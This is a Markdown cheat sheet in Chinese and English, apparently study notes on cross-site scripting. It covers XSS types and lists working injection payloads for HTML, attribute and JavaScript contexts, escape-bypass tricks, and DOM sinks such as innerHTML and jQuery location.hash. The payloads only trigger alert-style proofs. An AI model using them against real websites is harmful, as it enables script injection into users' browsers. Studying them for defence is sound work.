# Cross-site scripting (XSS)
## Types of XSS
### Reflected XSS
* 來自當前的 HTTP 請求，然後伺服器的回應。
```
https://insecure-website.com/status?message=All+is+well.
<p>Status: All is well.</p>
```
### Stored XSS
* 來自網站的資料庫，e.x.留言。
```
<p>Hello, this is my message!</p>
```
### DOM-based XSS
* 來自客戶端程式碼，客戶端的程式碼將輸入直接寫入網頁中。
```
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```
### Self XSS
* Self-XSS通過誘騙用戶將惡意內容複製，並貼到瀏覽器的web開發者控制台進行攻擊。
*  XSS 是針對網站本身的攻擊（用戶無法保護自己，但可以由網站運營商修復，使他們的網站更安全）。
*   Self-XSS 是一種針對用戶的社會工程攻擊（精明的用戶可以保護自己免受攻擊，但網站運營商對此無能為力）。
## XSS contexts
### XSS between HTML tags
* [SVG animate XSS vector (透過svg動畫來注入xss)](https://portswigger.net/research/svg-animate-xss-vector)
```
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```
* [select option 中插入 xss](https://security.stackexchange.com/questions/136265/is-an-option-tag-that-can-have-any-inner-html-value-inserted-into-it-xss-able)
```
<select>
    <option>ANY VALUE</option>
</select>
```
```
</option></select><svg onload=alert(1)>
```
### XSS in HTML tag attributes
* 加入新的tag，來注入xss。
```
"><script>alert(0)</script>
```
* 加入新的 attr，來注入xss。
```
" autofocus onfocus=alert(0) x="
```
* javascript pseudo-protocol
```
<a href="javascript:alert(0)">
```
* [canonical link tag](https://portswigger.net/research/xss-in-hidden-input-fields)
```
https://url/?'accesskey='x'onclick='alert(1)
```
### XSS into JavaScript
#### Terminating the existing script
* 假設現在情境是使用者輸入會被寫到 input。
```
<script>
...
var input = 'controllable data here';
...
</script>
```
* 我們可以用下面的 payload 來達成 xss，因為對瀏覽器而言會先解析 html 標籤，而我們的 payload 破壞了原本的 script，但瀏覽器還是會繼續執行其他script，因此會觸發我們的 payload。
```
</script><img src=1 onerror=alert(0)>
```
* 加入 payload 之結果。
```
<script>
...
var input = '</script><img src=1 onerror=alert(0)>';
...
</script>
```
#### Breaking out of a JavaScript string
* 可以用下列方法，用來打破字串執行 script。 (減號 `-` 的用法原理可以參考[這篇](https://stackoverflow.com/questions/55498784/cross-site-scripting-xss-using-a-hyphen))
```
'-alert(0)-'
';alert(0)//
```
* 有些網站可能會轉義 `'` 單引號成`\'`，但他們並未將`\`前的字符應該保留而不轉義，因此我們可以透過下面手法，來達成攻擊。
```
';alert(0)//   原本payload
\';alert(0)//  被轉義後
```
```
\';alert(0)//  新的payload
\\';alert(0)// 被轉義後
```
* 此外，我們可以透過 throw 與 onerror 來 bypass 網站的防禦。透過 throw 傳遞參數給 alert，這邊將會把 1 傳給 alert。
```
onerror=alert;throw 1
```
#### Making use of HTML-encoding
* 有時我們可以透過 html 編碼來繞過過濾器，`&apos;` 為 `'`的 html 編碼。
```
&apos;-alert(0)-&apos;
```
#### XSS in JavaScript template literals
* 有時我們可以透過 js 的模板文字插入 xss。
```
${alert(0)}
```
### Exploiting DOM XSS with different sources and sinks
#### document.write()
* document.write() 中可以執行 script，因此可以利用下面 payload。
```
document.write('... <script>alert(0)</script> ...');
```
#### innerHTML
* innerHTML 中不會執行 script 與 svg onload event，所以可以改用 iframe、img ，並搭配 onload 、onerror event。
```
element.innerHTML='... <img src=1 onerror=alert(0)> ...'
``` 
### Sources and sinks in third-party dependencies
#### attr()
* 利用 attr func 加入 href 屬性值中插入 xss。
```
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
```
?returnUrl=javascript:alert(document.domain)
```
#### location.hash
* 利用 location hash 中加入 xss。
* 此方法會成功主要是因為，jQuery選擇器`$()`當中，我們可以直接加入我們想要的標籤，來觸發執行 js。
* `$(<img src=1 onerror=alert(1)>)` 簡單來說這是會執行出 alert 的。
```
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```
```
https://vulnerable-website.com#<img src=x onerror=print()>
```
```
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```
---
###### tags: `web security`